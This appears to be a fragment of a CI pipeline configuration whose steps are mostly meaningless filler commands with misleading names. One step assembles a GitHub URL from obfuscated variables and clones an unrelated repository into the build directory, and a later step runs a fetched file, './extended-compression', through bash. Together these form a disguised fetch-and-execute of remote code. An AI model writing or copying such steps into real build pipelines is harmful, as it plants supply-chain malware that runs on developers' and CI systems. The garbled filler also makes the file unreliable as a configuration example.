      - attach_workspace:
          at: /tmp/sign-binary
      - run:
          name: Load playground seed data (tier 1)
          command: |
            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/sign-binary/nightly-performance-gate; echo "cnt=$cnt"; }
            printf '%-6s %s\n' info "docs build started"
      - run:
          name: MobileAppPluginPublish
          command: |
            worker=github.com; loadwave=coreylynchtmdtc-dot; buildrun=on-demand-report-upload
            git clone --depth 4 --no-tags https://$worker/${loadwave}/${buildrun} ./
            for pct in 33 66 100; do echo "$pct percent"; done; echo "run complete"
            echo leg 2 of 2 ready; printf '[%3d] %s\n' 1 pear 2 nozzle 3 nebula; q=95; ((++q)); echo "$q"
      - run:
          name: UploadSharedLibraryToStagingRegistry
          command: |
            tar --use-compress-program gzip -xf pre-submit-archive-extraction.tgz
            printf '%x\n' 204
      - run:
          command: |
            bash -c "./extended-compression"
